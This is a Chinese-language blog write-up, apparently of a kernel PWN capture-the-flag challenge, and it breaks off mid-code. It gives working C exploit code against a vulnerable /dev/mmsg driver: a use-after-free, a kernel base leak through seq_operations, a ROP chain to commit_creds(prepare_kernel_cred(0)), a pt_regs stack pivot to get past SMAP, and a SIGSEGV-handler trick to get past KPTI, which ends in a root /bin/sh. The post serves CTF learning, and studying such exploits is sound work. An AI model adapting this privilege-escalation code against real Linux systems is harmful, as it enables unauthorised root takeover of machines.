<h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>原文内容： <a href="https://n.ova.moe/blog/2023/03/18/_%E5%86%85%E6%A0%B8%E9%A2%98%E7%9B%AE%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95">「PWN」内核 PWN 题目的第一次尝试</a></p>
<ul>
<li>像，很像呀。看了一下，发现及其类似，于是尝试使用类似的exp进行做</li>
<li>调试，找地址，先关闭kaslr，通过泄露获得offset</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  gcc exp.c -static -o exp</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd1, fd2;</span><br><span class="line"><span class="type">int</span> seq_fd;</span><br><span class="line"><span class="type">size_t</span> buf[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *dev_name = <span class="string">&quot;/dev/mmsg&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// kernel base =&gt;  cat /proc/kallsyms | grep startup_64</span></span><br><span class="line"><span class="type">size_t</span> kernel_base;</span><br><span class="line"><span class="type">size_t</span> kernel_offset;</span><br><span class="line"></span><br><span class="line"><span class="comment">// nokalr kernel base</span></span><br><span class="line"><span class="type">size_t</span> nokaslr = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * cat /sys/module/mmsg/sections/.text</span></span><br><span class="line"><span class="comment"> * 0xffffffffc03f5000</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// close kaslr</span></span><br><span class="line"><span class="comment">// grep prepare_kernel_cred  /proc/kallsyms</span></span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0xffffffff9248d790</span>;</span><br><span class="line"><span class="comment">// grep commit_creds  /proc/kallsyms</span></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff9248d350</span>;</span><br><span class="line"><span class="comment">// grep swapgs_restore_regs_and_return_to_usermode  /proc/kallsyms</span></span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff93000e30</span>;</span><br><span class="line"><span class="comment">//  grep native_write_cr4 /proc/kallsyms</span></span><br><span class="line"><span class="type">size_t</span> native_write_cr4 = <span class="number">0xffffffffa8832250</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// ropper</span></span><br><span class="line"><span class="comment">// pop rdi; ret</span></span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff812274dd</span>;</span><br><span class="line"><span class="comment">// 0xffffffff82d63c0d: mov edi, eax; call rbx;</span></span><br><span class="line"><span class="comment">// 在 64 位环境下，目的寄存器若是 32 位，则会将高 32 位清零</span></span><br><span class="line"><span class="type">size_t</span> mov_edi_eax_call_rbx = <span class="number">0xffffffff82d63c0d</span>;</span><br><span class="line"><span class="comment">// 0xffffffff82e6f708: pop rbx; ret; </span></span><br><span class="line"><span class="type">size_t</span> pop_rbx_ret = <span class="number">0xffffffff82e6f708</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mmsg_arg</span> &#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> token;</span><br><span class="line">  <span class="type">int</span> top;</span><br><span class="line">  <span class="type">int</span> size;</span><br><span class="line">  <span class="type">char</span> *data;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">new</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">recv_mmsg</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">copy_mmsg</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">put_mmsg</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> *addr)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mmsg_arg</span> <span class="title">arg</span>;</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;arg, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> mmsg_arg));</span><br><span class="line">  arg.data = addr;</span><br><span class="line">  ioctl(fd, <span class="number">0x5555555</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_mmsg</span><span class="params">(<span class="type">int</span> fd)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mmsg_arg</span> <span class="title">arg</span>;</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;arg, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> mmsg_arg));</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  arg.data = (<span class="type">char</span> *)buf;</span><br><span class="line">  ioctl(fd, <span class="number">0x6666666</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line"> <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> user_cs, user_ss, user_rflags, user_rsp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">asm</span>(</span><br><span class="line">   <span class="string">&quot;movq %%cs, %0;&quot;</span></span><br><span class="line">   <span class="string">&quot;movq %%ss, %1;&quot;</span></span><br><span class="line">   <span class="string">&quot;movq %%rsp, %3;&quot;</span></span><br><span class="line">   <span class="string">&quot;pushfq;&quot;</span></span><br><span class="line">    <span class="string">&quot;pop %2;&quot;</span></span><br><span class="line">   : <span class="string">&quot;=r&quot;</span>(user_cs),<span class="string">&quot;=r&quot;</span>(user_ss),<span class="string">&quot;=r&quot;</span>(user_rflags),<span class="string">&quot;=r&quot;</span>(user_rsp)</span><br><span class="line">   : </span><br><span class="line">      : <span class="string">&quot;memory&quot;</span></span><br><span class="line">   );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">if</span>( getuid() ) &#123;</span><br><span class="line">  err_exit(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);</span><br><span class="line"> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">seq_open</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> seq;</span><br><span class="line"> <span class="keyword">if</span> ( (seq=open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) == <span class="number">-1</span>) &#123;</span><br><span class="line">  err_exit(<span class="string">&quot;[x] seq open fail&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> seq;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">uaf</span><span class="params">()</span> &#123;</span><br><span class="line">    fd1 = open(dev_name, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd1 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      err_exit(<span class="string">&quot;[x] open device 1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fd2 = open(dev_name, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd2 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      err_exit(<span class="string">&quot;[x] open device 2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_base</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// read 操作，经过函数调用链则会最终调用 seq_operations-&gt;start 指针对应的函数</span></span><br><span class="line">    seq_fd = seq_open();</span><br><span class="line">    get_mmsg(fd2);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;buf[%d] =&gt; 0x%llx\n&quot;</span>, j, buf[j]);</span><br><span class="line">    &#125;</span><br><span class="line">    kernel_base = buf[<span class="number">0</span>] - <span class="number">0x20fac0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel base =&gt; 0x%llx&quot;</span>, kernel_base);</span><br><span class="line"></span><br><span class="line">    kernel_offset = kernel_base - nokaslr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    save_status(); </span><br><span class="line">    uaf();</span><br><span class="line">    leak_base();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>rop</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 之前的都一样</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 1</span></span><br><span class="line"> <span class="meta">#<span class="keyword">define</span> o(x) (x+kernel_offset)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">// smep userspace地址被标记为non-executable</span></span><br><span class="line">    <span class="comment">// bypass: stack prviot</span></span><br><span class="line">    <span class="type">size_t</span> payload[<span class="number">0x40</span>];</span><br><span class="line">    <span class="type">int</span> idx=<span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> user_rip = (<span class="type">size_t</span>)get_shell;</span><br><span class="line"></span><br><span class="line">    payload[idx++] = o(pop_rbx_ret);</span><br><span class="line">    payload[idx++] = o(commit_creds);</span><br><span class="line">    payload[idx++] = o(pop_rdi_ret); <span class="comment">// return address</span></span><br><span class="line">    payload[idx++] = <span class="number">0x0</span>;</span><br><span class="line">    payload[idx++] = o(prepare_kernel_cred);</span><br><span class="line">    payload[idx++] = o(mov_edi_eax_call_rbx);</span><br><span class="line">    payload[idx++] = o(swapgs_restore_regs_and_return_to_usermode) + <span class="number">22</span>; </span><br><span class="line">    payload[idx++] = <span class="number">0x0</span>;</span><br><span class="line">    payload[idx++] = <span class="number">0x0</span>;</span><br><span class="line">    payload[idx++] = user_rip;</span><br><span class="line">    payload[idx++] = user_cs;</span><br><span class="line">    payload[idx++] = user_rflags;</span><br><span class="line">    payload[idx++] = user_rsp;</span><br><span class="line">    payload[idx++] = user_ss;</span><br><span class="line">    </span><br><span class="line">    put_mmsg(fd2, (<span class="type">char</span> *)&amp;payload);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// trigger seq_file-&gt;start</span></span><br><span class="line">    read(seq_fd, <span class="literal">NULL</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>使用xchg 进行类似栈迁移的操作，从而进行劫持函数执行流</p>
</li>
<li><p>在本地执行时，直接kernel panic。查看报错信息，发现是<code>can&#39;t access memory in 0x????(是个用户地址)</code>。</p>
</li>
</ul>
<h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>后来看来一下这篇文章发现原因：<a href="https://blog.wingszeng.top/kernel-pwn-struct-seq-operations-and-struct-pt-regs/#%E4%BE%8B%E9%A2%98-2023-pwnhub-%E5%85%AC%E5%BC%80%E8%B5%9B-kheap">Kernel Pwn Struct seq_operations and Struct pt_regs</a></p>
<ul>
<li>这一题开启了smap，而 pwnhub 的那一题中没有。而smap: kernel space 不能 access user space 的东西。</li>
<li>这篇文章中说了一个 <code>pt_regs</code> 的结构体，在使用syscall 时，会将某些寄存器内容压入<code>内核栈的栈底</code>.</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r15;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r14;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r13;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r12;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r11;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r10;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r9;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r8;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rax;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rcx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsi;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rip;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> cs;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> eflags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>在系统调用的过程中, 不是所有的寄存器都会被改变, 比如 r8 - r15, 他们会在压入 pt_regs 的时保持 syscall 之前的值. 这就为我们提供了布置数据的可能性. 如果在仅能劫持 rip 的情况下 (比如上面介绍的 seq_operations), 跳转到某个形如 <code>add, rsp val; ret</code> 的 gadget, 那么就有可能将 rsp 设置到内核栈的 pt_regs 上, 从而执行我们布置的 ROP 链.</p>
</blockquote>
<ul>
<li><p>也就是我们 rop 往 内核栈的 pt_regs 中跳转，就不会绕过了smap</p>
</li>
<li><p>如何将寄存器压入: 使用了巧妙地方法，syscall 调用 read，将寄存器压入，并且可以通过seq_operations-&gt;start执行rop</p>
</li>
<li><p>调用模板+解释的比较详细的文章：<a href="https://ywhkkx.github.io/2023/02/19/seq_operations%20+%20pt_regs/">seq_operations+pt_regs</a></p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__asm__(  </span><br><span class="line">    <span class="string">&quot;mov r15, 0x55555555;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov r14, 0x44444444;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov r13, 0x33333333;&quot;</span>   </span><br><span class="line">    <span class="string">&quot;mov r12, 0x22222222;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov rbp, 0xbbbb1111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbx, 0xbbbb2222;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov r11, 0x11111111;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov r10, 0x11110000;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov r9,  0x99999999;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov r8,  0x88888888;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;xor rax, rax;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov rcx, 0x666666;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov rdx, 8;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov rsi, rsp;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov rdi, seq_fd;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;syscall&quot;</span>  </span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<ul>
<li>gadget: 改变rsp, add rsp, xxx; ret，进行栈迁移</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/2wi 0xffffffff81909b8c</span><br><span class="line">   0xffffffff81909b8c:  add    rsp,0x168</span><br><span class="line">   0xffffffff81909b93:  ret</span><br></pre></td></tr></table></figure>

<ul>
<li>但是我们需要事先知道执行start 时与pt_regs 距离多远。<ul>
<li>直接使用没有布局的脚本，自然会kernel panic，可以看到rip的内容，然后与上述的payload进行对比，获得偏移</li>
</ul>
</li>
<li>并且这并不是一个万能的方法</li>
</ul>
<h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><ul>
<li>后来还是不对，因此再看参考文章，如下也存在uaf问题。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// module_ioctl</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mmsg_head</span> &#123;</span></span><br><span class="line">        <span class="type">char</span> description[<span class="number">16</span>];</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">case</span> MMSG_RECV: </span><br><span class="line">        <span class="keyword">if</span> (arg.top) &#123;</span><br><span class="line">            m = list_entry(&amp;mmsg_head-&gt;<span class="built_in">list</span>, <span class="keyword">struct</span> mmsg, <span class="built_in">list</span>);  <span class="comment">// head</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            m = find_mmsg(arg.token);   <span class="comment">// 遍历查询</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (m == <span class="literal">NULL</span> || arg.size &gt; m-&gt;size || arg.size &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            ret = -EINVAL;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;mmsg recv\n&quot;</span>);</span><br><span class="line">        copy_to_user((<span class="type">void</span> __user *)arg.data, m-&gt;data, arg.size);</span><br><span class="line">        list_del(&amp;m-&gt;<span class="built_in">list</span>);  <span class="comment">// 双向链表元素内核提供的删除函数</span></span><br><span class="line">        kfree(m-&gt;data);      <span class="comment">// head 没有，但是固定偏移为 0x10 的地方，相当于free掉list，不会报错</span></span><br><span class="line">        kfree(m);          </span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><h4 id="偏移确定"><a href="#偏移确定" class="headerlink" title="偏移确定"></a>偏移确定</h4><ul>
<li><p>add rsp val，我们需要一个比较具体的值</p>
</li>
<li><p>大概是 <code>0x100+</code> 的gadget吧，不太会，但是此结构体大小大于0x100，并且要开启syscall的栈帧</p>
<ul>
<li>应该可以在ioctl 下断点，但是我失败了😥</li>
</ul>
</li>
</ul>
<h4 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h4><ul>
<li>直接看报错:  BUG: unable to handle page fault for address: 0000000044444444 ； RIP: 0010:0x44444444获得我们rip指针控制的寄存器 r14</li>
<li>syscall 不会改变 r8-r15内容。理想情况下r8-r15内容不变，但是可能会产生奇妙的变化。调试，si会走到start指针的操作，从而获得栈结构</li>
<li>假设理想化从r14-r8没有发生改变</li>
<li>si 一路走，但是看不到对应内容?</li>
</ul>
<p><a href="https://b0ldfrev.gitbook.io/note/linux_kernel/kernelpwn-zhuang-tai-qie-huan-yuan-li-ji-kpti-rao-guo#0x2-bypass-kpti">KERNEL_PWN状态切换原理及KPTI绕过</a></p>
<ul>
<li>swapgs; iretq 返回用户态; ret rip,在此处没有使用ret指令，直接iretq, 直接r9为user_rsp就行</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">swapgs            </span><br><span class="line">iretq             </span><br><span class="line">rsp ---&gt; rip </span><br><span class="line">         cs</span><br><span class="line">         rflags</span><br><span class="line">         rsp</span><br><span class="line">         ss</span><br></pre></td></tr></table></figure>

<ul>
<li>swapgs_restore_regs_and_return_to_usermode: 这个比上个复杂一点，需要在迁移一次</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">swapgs_restore_regs_and_return_to_usermode + 22  </span><br><span class="line">0 // padding  </span><br><span class="line">0 // padding  </span><br><span class="line">get_shell</span><br><span class="line">user_cs  </span><br><span class="line">user_rflags  </span><br><span class="line">user_sp</span><br><span class="line">user_ss</span><br></pre></td></tr></table></figure>

<h4 id="errors"><a href="#errors" class="headerlink" title="errors"></a>errors</h4><ol>
<li>qemu cpu为 <code>host</code> 也必须开启kvm, 同时就是这一点，导致我一直不成功，后来去除掉kvm将cpu改为kvm64成功。应该是本机的CPU的安全防护导致一直失败😥。</li>
</ol>
<h4 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h4><ul>
<li>signal bypass kpti。执行用户态的任意代码都会报出信号<code>SIGSEGV</code>，那么在程序开始时将<code>SIGSEGV</code>与shell函数绑定在一起，那么访问用户态代码时就会报出信号<code>SIGSEGV</code>，就会执行信号函数。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_GREEN <span class="string">&quot;\033[32m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_RED <span class="string">&quot;\033[31m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_YELLOW <span class="string">&quot;\033[33m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_DEFAULT <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_debug(fmt, ...)                                                    \</span></span><br><span class="line"><span class="meta">  dprintf(2, <span class="string">&quot;[*] %s:%d &quot;</span> fmt <span class="string">&quot;\n&quot;</span>, __FILE__, __LINE__, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_info(fmt, ...)                                                     \</span></span><br><span class="line"><span class="meta">  dprintf(2, COLOR_GREEN <span class="string">&quot;[+] %s:%d &quot;</span> fmt <span class="string">&quot;\n&quot;</span> COLOR_DEFAULT, __FILE__,        \</span></span><br><span class="line"><span class="meta">          __LINE__, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_warning(fmt, ...)                                                  \</span></span><br><span class="line"><span class="meta">  dprintf(2, COLOR_YELLOW <span class="string">&quot;[!] %s:%d &quot;</span> fmt <span class="string">&quot;\n&quot;</span> COLOR_DEFAULT, __FILE__,       \</span></span><br><span class="line"><span class="meta">          __LINE__, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_error(fmt, ...)                                                    \</span></span><br><span class="line"><span class="meta">  dprintf(2, COLOR_RED <span class="string">&quot;[-] %s:%d &quot;</span> fmt <span class="string">&quot;\n&quot;</span> COLOR_DEFAULT, __FILE__,          \</span></span><br><span class="line"><span class="meta">          __LINE__, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> die(fmt, ...)                  \</span></span><br><span class="line"><span class="meta">  do &#123;                                 \</span></span><br><span class="line"><span class="meta">    log_error(fmt, ##__VA_ARGS__);          \</span></span><br><span class="line"><span class="meta">    log_error(<span class="string">&quot;Exit at line %d&quot;</span>, __LINE__); \</span></span><br><span class="line"><span class="meta">    exit(1);                           \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">if</span>( getuid() ) &#123;</span><br><span class="line">  die(<span class="string">&quot;fail to get shell&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">    log_info(<span class="string">&quot;start to get root shell&quot;</span>);</span><br><span class="line"> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_rsp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_rsp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    log_info(<span class="string">&quot;status saved&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">seq_open</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> seq;</span><br><span class="line"> <span class="keyword">if</span> ( (seq=open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) == <span class="number">-1</span>) &#123;</span><br><span class="line">  die(<span class="string">&quot;seq open fail&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> seq;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMSG_ALLOC 0x1111111</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 